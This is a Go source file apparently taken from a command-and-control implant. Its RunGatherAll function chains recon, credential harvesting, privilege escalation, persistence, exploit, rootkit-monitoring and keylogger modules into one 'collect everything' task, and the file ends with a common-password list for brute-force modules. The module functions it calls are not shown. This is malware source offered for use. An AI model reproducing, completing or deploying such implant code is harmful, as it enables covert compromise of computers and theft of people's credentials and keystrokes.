package module

import (
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/shell"
)

const cmdTimeout = 30 * time.Second

// run wraps shell.Run with the standard timeout.
func run(cmd string) (string, error) {
	return shell.Run(cmd, cmdTimeout)
}

// escapeSQ escapes single quotes for shell commands.
func escapeSQ(s string) string {
	return strings.ReplaceAll(s, "'", "'\\''")
}

// RunGatherAll runs all intelligence-gathering modules in sequence
// and returns a combined report. This is the "collect everything" task.
func RunGatherAll(params map[string]interface{}) (string, error) {
	var results []string

	// Recon
	if r, err := RunReconAll(params); err == nil {
		results = append(results, "=== RECON ===\n"+r)
	}

	// Credentials
	if r, err := RunCredentialAll(params); err == nil {
		results = append(results, "=== CREDENTIALS ===\n"+r)
	}

	// Privilege escalation
	if r, err := RunPrivescAll(params); err == nil {
		results = append(results, "=== PRIVESC ===\n"+r)
	}

	// Persistence
	if r, err := RunPersistenceAll(params); err == nil {
		results = append(results, "=== PERSISTENCE ===\n"+r)
	}

	// Exploits
	if r, err := RunExploitAll(params); err == nil {
		results = append(results, "=== EXPLOITS ===\n"+r)
	}

	// Monitor / rootkit
	if r, err := RunMonitorAll(params); err == nil {
		results = append(results, "=== MONITOR ===\n"+r)
	}

	// Keylog (short capture)
	klParams := map[string]interface{}{"duration": 5}
	if r, err := RunCollectKeylog(klParams); err == nil {
		results = append(results, "=== KEYLOG ===\n"+r)
	}

	if len(results) == 0 {
		return "No intelligence could be gathered.", nil
	}

	return strings.Join(results, "\n\n"), nil
}

// commonPasswords used by brute force modules across all platforms.
var commonPasswords = []string{
	"password", "admin", "root", "123456", "12345678",
	"qwerty", "letmein", "welcome", "Passw0rd!", "toor",
	"test", "1234", "12345", "123456789", "1234567890",
	"passwd", "iloveyou", "abc123", "password123", "P@ssw0rd",
}
